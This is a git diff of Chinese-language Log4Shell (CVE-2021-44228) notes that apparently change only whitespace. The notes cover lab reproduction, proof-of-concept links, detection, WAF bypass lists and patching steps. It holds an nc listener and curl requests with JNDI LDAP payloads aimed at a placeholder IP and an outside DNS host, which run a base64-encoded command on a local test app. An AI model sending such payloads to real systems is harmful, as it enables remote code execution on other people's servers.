@@ -1,11 +1,11 @@
 # log4j
 
 ## 信息
+
 https://github.com/NCSC-NL/log4shell
 
 各产品影响
 https://github.com/YfryTchsGD/Log4jAttackSurface
-
 
 ## 复现
 
@@ -54,7 +54,6 @@ nc -lnvp 9999
 只是警告，不管
 
 https://github.com/xiajun325/apache-log4j-rce-poc
-
 
 ```bash
 git clone git@github.com:xiajun325/apache-log4j-rce-poc.git
@@ -122,8 +121,6 @@ https://davinsi.com/threat-advisory-apache-log4j-rce/
 Java 8u121 (see https://www.oracle.com/java/technologies/javase/8u121-relnotes.html ) protects 
 against RCE by defaulting com.sun.jndi.rmi.object.trustURLCodebase and com.sun.jndi.cosnaming.object.trustURLCodebase to false.
 
-
-
 ### 在线测试端口
 
 https://log4shell.huntress.com/
@@ -163,7 +160,6 @@ docker run -p 8081:8080 --name vulnerable-app vulnerable-app
 curl 127.0.0.1:8080 -H 'X-Api-Version: ${jndi:ldap://your-private-ip:1389/Basic/Command/Base64/dG91Y2ggL3RtcC9wd25lZAo=}'
 curl 127.0.0.1:8081 -H 'X-Api-Version: ${jndi:ldap://78769f89.dns.1433.eu.org:1389/Basic/Command/Base64/dG91Y2ggL3RtcC9wd25lZAo=}'
 
-
 jdeps /app/spring-boot-application.jar
 jdeps  -summary -recursive /app/spring-boot-application.jar
 
@@ -185,7 +181,6 @@ Exploiting CVE-2021-42278 and CVE-2021-42287 to impersonate DA from standard dom
 ### 其它POC
 
 https://github.com/kozmer/log4j-shell-poc
-
 
 ### DNSLOG
 
@@ -219,7 +214,9 @@ https://github.com/Neo23x0/log4shell-detector
 log4shell-detector is a python-based tool that searches for log files and, from the logs strings, tries to detect any exploitation attempts.
 
 ## WAF
+
 https://github.com/Puliczek/CVE-2021-44228-PoC-log4j-bypass-words
+
 ## 补丁
 
 删除 lookup包
@@ -235,7 +232,6 @@ sha1sum log4j-core-2.14.0.jar
 5de0d92e9719c1b7b92e7390e91ef46571d7102f  log4j-core-2.14.0.jar
 jar vtf log4j-core-2.14.0.jar |findstr  JndiLookup
 
-
 zip -q -d log4j-core-*.jar org/apache/logging/log4j/core/lookup/JndiLookup.class
 
 https://bmcsites.force.com/casemgmt/sc_KnowledgeArticle?sfdcid=000391450
@@ -244,6 +240,7 @@ https://bmcsites.force.com/casemgmt/sc_KnowledgeArticle?sfdcid=000391450
 https://research.nccgroup.com/2021/12/12/log4j-jndi-be-gone-a-simple-mitigation-for-cve-2021-44228/
 
 ### 升级版本
+
 最新为 2.16.0 ,升级到 2.15.0 时出现新的漏洞，会造成DDOS
 https://logging.apache.org/log4j/2.x/
 
@@ -254,6 +251,7 @@ This could allows attackers with control over Thread Context Map (MDC) input dat
 是已经升级到 2.15.0 的
 
 ### 运行时的热补丁
+
 https://github.com/corretto/hotpatch-for-apache-log4j2
 
 APACHE LOG4J2 远程代码执行漏洞处置手册
@@ -301,7 +299,6 @@ https://log.xn--9tr.com/
 http://dnslog.cn/
 [DNS 原理入门](https://www.ruanyifeng.com/blog/2016/06/dns.html)
 
-
 [Apache Log4j远程代码执行漏洞风险通报信息汇总](https://www.freebuf.com/articles/308151.html)
 
 POC：
@@ -316,7 +313,6 @@ https://itsc.nju.edu.cn/7a/42/c41947a555586/page.htm
 （2）  修改配置log4j2.formatMsgNoLookups=True
 （3）  将系统环境变量 FORMAT_MESSAGES_PATTERN_DISABLE_LOOKUPS 设置为 true
   TODO: 需要重启吗？还是写在bash里就可以了
-
 
 ## 厂商声明
 
@@ -334,7 +330,6 @@ https://tomcat.apache.org/tomcat-8.0-doc/logging.html#Using_Log4j
 tomcat 默认不使用log4j2
 
 ### 其它参考
-
 
 安全工具 | log4j ldap 恶意class下载工具
 https://www.anquanke.com/post/id/263300
